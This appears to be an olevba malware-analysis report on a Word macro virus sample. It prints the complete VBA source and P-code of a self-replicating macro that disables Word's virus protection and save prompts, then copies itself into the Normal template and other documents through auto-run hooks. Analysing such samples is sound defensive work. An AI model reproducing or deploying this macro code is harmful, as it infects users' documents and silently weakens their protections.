olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Temp29
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Temp29 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
On Error GoTo ou: Options.VirusProtection = False: Options.SaveNormalPrompt = False: Options.ConfirmConversions = False
Set NTVBC = NormalTemplate.VBProject.VBComponents.Item(1): Set ADVBC = ActiveDocument.VBProject.VBComponents.Item(1)
ad = ADVBC.codemodule.CountOfLines: nt = NTVBC.codemodule.CountOfLines: EXPFN = Environ("temp") & "\~CL7610_2.~MP"
If nt > 28 And ad > 28 Then GoTo ou
If nt < 29 Then
    Set dhst = NTVBC
    Set shst = ADVBC
Else
    Set dhst = ADVBC
    Set shst = NTVBC
End If
shst.Name = dhst.Name
shst.Export (EXPFN)
With dhst.codemodule
.AddFromFile (EXPFN)
.deletelines 1, 4
temp$ = .lines(1, 1)
.replaceline 1, "Sub AutoOpen()"
.replaceline 19, ".replaceline 1," & Chr$(34) & temp$ & Chr$(34)
temp$ = .lines(28, 1)
.replaceline 28, "Sub ToolsMacro()"
.replaceline 22, ".replaceline 28," & Chr$(34) & temp$ & Chr$(34)
End With
Kill (EXPFN)
ou:
End Sub
Sub ViewVBCode()
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Temp29
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5746 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	OnError ou 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #2:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NTVBC 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ADVBC 
' Line #3:
' 	Ld ADVBC 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St ad 
' 	BoS 0x0000 
' 	Ld NTVBC 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St nt 
' 	BoS 0x0000 
' 	LitStr 0x0004 "temp"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x000E "\~CL7610_2.~MP"
' 	Concat 
' 	St EXPFN 
' Line #4:
' 	Ld nt 
' 	LitDI2 0x001C 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x001C 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo ou 
' 	EndIf 
' Line #5:
' 	Ld nt 
' 	LitDI2 0x001D 
' 	Lt 
' 	IfBlock 
' Line #6:
' 	SetStmt 
' 	Ld NTVBC 
' 	Set dhst 
' Line #7:
' 	SetStmt 
' 	Ld ADVBC 
' 	Set shst 
' Line #8:
' 	ElseBlock 
' Line #9:
' 	SetStmt 
' 	Ld ADVBC 
' 	Set dhst 
' Line #10:
' 	SetStmt 
' 	Ld NTVBC 
' 	Set shst 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	Ld dhst 
' 	MemLd New 
' 	Ld shst 
' 	MemSt New 
' Line #13:
' 	Ld EXPFN 
' 	Paren 
' 	Ld shst 
' 	ArgsMemCall Export 0x0001 
' Line #14:
' 	StartWithExpr 
' 	Ld dhst 
' 	MemLd codemodule 
' 	With 
' Line #15:
' 	Ld EXPFN 
' 	Paren 
' 	ArgsMemCallWith AddFromFile 0x0001 
' Line #16:
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	ArgsMemCallWith deletelines 0x0002 
' Line #17:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith lines 0x0002 
' 	St temp$ 
' Line #18:
' 	LitDI2 0x0001 
' 	LitStr 0x000E "Sub AutoOpen()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #19:
' 	LitDI2 0x0013 
' 	LitStr 0x000F ".replaceline 1,"
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld temp$ 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #20:
' 	LitDI2 0x001C 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith lines 0x0002 
' 	St temp$ 
' Line #21:
' 	LitDI2 0x001C 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #22:
' 	LitDI2 0x0016 
' 	LitStr 0x0010 ".replaceline 28,"
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld temp$ 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #23:
' 	EndWith 
' Line #24:
' 	Ld EXPFN 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #25:
' 	Label ou 
' Line #26:
' 	EndSub 
' Line #27:
' 	FuncDefn (Sub ViewVBCode())
' Line #28:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

